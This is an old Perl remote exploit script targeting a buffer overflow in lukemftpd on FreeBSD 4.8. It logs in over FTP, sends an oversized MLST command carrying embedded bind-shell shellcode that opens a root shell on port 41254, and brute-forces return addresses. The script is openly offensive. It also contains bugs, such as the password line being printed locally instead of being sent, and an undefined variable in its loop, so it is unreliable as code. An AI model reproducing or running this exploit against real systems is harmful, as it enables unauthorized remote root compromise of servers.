#!/usr/bin/perl

#realpath lukemftpd remote exploit for freeBSD 4.8
#i managed to code this, and lose the first copy, hence a re-write :(
#deadbeat,
#left without any return addresses/offsets purposely to stop kids using it..
#want the rets/offsets? heh..
#
#tested on freeBSD 4.8 and it worked ;) it worked ;)
#e: daniels@legend.co.uk
#e: deadbeat@sdf.lonestar.org

use IO::Socket;

$user = $ARGV[0];
$pass = $ARGV[1];
$ret = $ARGV[2];
$offset = $ARGV[3];
$host = $ARGV[4];
$buf= 1024;
$n = "./";
print "lukemftpd remote for FreeBSD 4.8 ..\n";
print "this is the kiddiot version, go grab them ret's+offsets..lool\n";
print "contact me and i might give u the rets/offsets\n";
if(!$ARGV[4]){
	die "Usage: perl $0 <user> <pass> <ret> <offset> <host>\n";
}
sub brute_force
{
	$r = $_[0];
	$o = $_[1];

		#shellcode from zillion.. from safemode.org...binds /bin/sh on 41254
	$hell =	"\xeb\x64\x5e\x31\xc0\x88\x46\x07\x6a\x06\x6a\x01\x6a\x02\xb0".
        		"\x61\x50\xcd\x80\x89\xc2\x31\xc0\xc6\x46\x09\x02\x66\xc7\x46".
        		"\x0a\xa1\x26\x89\x46\x0c\x6a\x10\x8d\x46\x08\x50\x52\x31\xc0".
        		"\xb0\x68\x50\xcd\x80\x6a\x01\x52\x31\xc0\xb0\x6a\x50\xcd\x80".
        		"\x31\xc0\x50\x50\x52\xb0\x1e\x50\xcd\x80\xb1\x03\xbb\xff\xff".
        		"\xff\xff\x89\xc2\x43\x53\x52\xb0\x5a\x50\xcd\x80\x80\xe9\x01".
        		"\x75\xf3\x31\xc0\x50\x50\x56\xb0\x3b\x50\xcd\x80\xe8\x97\xff".
        		"\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x23";

	$addr = pack('l', ($r+$o));
	for($i=0;$i <$buf; $i +=4){
		$buffer .=$addr;
	}
	for($i=0;$i<$buf - length($hell) /2;$i++){
		$buffer .=$n;
	}
	$buffer .=$hell;

	print "Connecting to: $host\n";
	$sox = IO::Socket::INET->new(
		Proto=>"tcp",
		PeerPort=>"21",
		PeerAddr=>"$host"
	)or die "cant connect to $host ...maybe try a real host ;)\n";
	sleep 1;
	print ("[+]Trying addr: 0x", sprintf('%lx', ($r + $o)),"\n");
	print $sox "user $user\r\n";
	sleep 1;
	print "pass $pass\r\n";
	sleep 1;
	print $sox "MLST $buffer\r\n";
	sleep 2;
	close $sox;
	print "Trying to connect to r00tshell\n";
	$sox = IO::Socket::INET->new(
		Proto=>"tcp",
		PeerPort=>"41254",
		PeerAddr=>"$host"
	)or die"No r00tshell this time, try using a proper offset/ret_addr..\n";
	print "Wicked we got a r00tshell on $host : 41254\n\n";
	close $sox;
}

for($a=0;$a<1000;$a++){
	$offset++;
	$reta = pack('l', ($ret+$o));
	print "Brute Force [$a]\n";
	brute_force($reta,$offset);
}

